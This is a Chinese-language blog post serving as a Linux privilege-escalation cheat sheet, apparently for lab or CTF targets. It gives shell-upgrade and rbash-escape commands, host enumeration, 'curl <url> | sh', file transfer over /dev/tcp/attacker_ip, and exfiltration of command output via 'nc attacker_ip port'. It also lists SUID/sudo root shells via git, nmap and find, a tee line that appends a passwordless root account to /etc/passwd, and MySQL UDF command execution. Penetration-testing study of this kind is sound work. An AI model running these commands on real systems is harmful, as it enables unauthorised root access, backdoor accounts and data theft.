+++
date = '2026-10-17T08:26:44+08:00'
draft = false
title = 'Linux提权'
tags = ["Linux", "提权"]
description = "Linux常见提权方法"
+++

## 终端优化

### 终端升级

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
stty raw -echo
export TERM=xterm-color
```

使用rlwrap修复方向键乱码问题

```bash
rlwrap nc -lvnp 443
```

### rbash逃逸

```bash
BASH_CMDS[a]=/bin/bash;a    # BASH_CMDS是个键值对对象，中存储着命令对应的地址，这里把bash的地址赋给a，再运行
export PATH=$PATH:/bin/
export PATH=$PATH:/usr/bin  # 修复环境变量
```

## 手动枚举
```bash
# 用户枚举
who     # 列出当前所有登录的用户的信息
w       # who详细版
last    # 系统最近的登录记录
# 系统信息枚举
cat /proc/version   # 显示详细内核信息
cat /etc/issue      # 发行版信息
hostnamectl         # 系统信息
# 网络枚举
ip route    # 查看路由表
ip neigh    # 同 ip n ，查看 IPv4 ARP / IPv6 NDP 邻居缓存
arp -a      # 查看ARP缓存
hostname    # 查看机器名称
# 权限枚举
sudo -l     # 查看当前用户sudo权限
getcap -l / 2>/dev/null # 查找具有特殊能力的可执行文件

cat /etc/crontab    # 查看自动任务
echo $PATH          # $PATH告诉shell去哪找命令对应的程序，从左向右一次寻找
env                 # 查看环境变量

ps -ef              # 列出所有进程(e, entire)，以列表形式(f)
ps axjf             # a所有进程、x显示无终端进程、j显示进程数、f列表格式输出
ps aux              # u显示启动进程的用户
top -n 1            # 仅刷新一次

netstat -a          # 显示所有正在监听的端口和已建立的连接
netstat -at         # 列出所有tcp端口
netstat -au         # 列出所有udp端口
netstat -l          # 列出所有正在监听的端口
netstat -s          # 统计网络使用情况
netstat -ano        # n不解析名称(以IP形式显示)，o显示计时器

find / -perm -u=s -type f 2>/dev/null   # 查找所有有s位的文件
which awk perl python ruby gcc nc netcat nmap ftp vi vim…… 2>/dev/null  # 检查是否安装软件并输出其位置，按照$PATH规则查找
cat /etc/fstab      # 查询未挂载磁盘

curl <url> | sh     # 直接执行在线脚本
```

## 便捷命令

### 建立一个简易服务器
```bash
sudo python3 -m http.server port
```

### 无curl命令传文件(利用伪设备)
攻击机执行：
```bash
nc -lvnp port < file.sh
```
靶机执行：
```bash
cat < /dev/tcp/attacker_ip/port # 后可拼接重定向/sh命令
```

### 靶机命令结果传回
靶机执行：
```bash
命令 | nc attacker_ip port
```
攻击机执行：
```bash
nc -lvnp port | tee result.txt  # tee命令将数据分流，同时输出到标准输出和文件中
```

### 原样输出控制字符
```bash
less -r result.txt
```

## SUID提权

### 查找所有具有SUID位的文件

```bash
find / -perm -u=s -type f 2>/dev/null
```

### 提权方法

### git 提权
```bash
sudo git help config
```
使 git 被动调用 more 进行显示，再输入 `!/bin/bash` 即可提权

### nmap提权
- 老版本
```bash
namp --interactive
!sh
```
- 新版本
```bash
echo "os.execute('/bin/bash')" > demon.nse
nmap --script=demon.nse
```

### find提权
```bash
find . -exec /bin/bash -p \;
```

### tee提权
tee可以向文件追加写入内容，向passwd中添加新的root用户，再切换到新用户即可完成提权
```bash
echo "test::0:0:: :/bin/bash" | sudo tee -a /etc/passwd
```

## 服务漏洞提权

### MySQL-UDF提权

提权条件：

1. 必须掌握一个具有创建/使用函数权限的MySQL账户
2. secure_file_priv 权限必须为空('')，除非指定的目录恰好就是我们在提权过程中用到的目录(如plugin目录)。该权限用于限制Load data、select into outfile、load_file()操作

提权原理：定义能够以高权限执行系统命令的函数，将该函数导入到数据库中，通过MySQL数据库执行系统命令以实现提权

searchsploit搜索udf利用exploit

```bash
searchsploit mysql udf
```

在靶机中查看secure_file_priv权限状况

```sql
show variables like '%secure_file_priv%';
```

查询plugin目录位置，创建UDF函数时会写入这里

```sql
show variables like '%plugin%';
```

查询所有定义的函数

```sql
select * from mysql.func;
```

执行命系统令

```sql
select your_func('command');
```
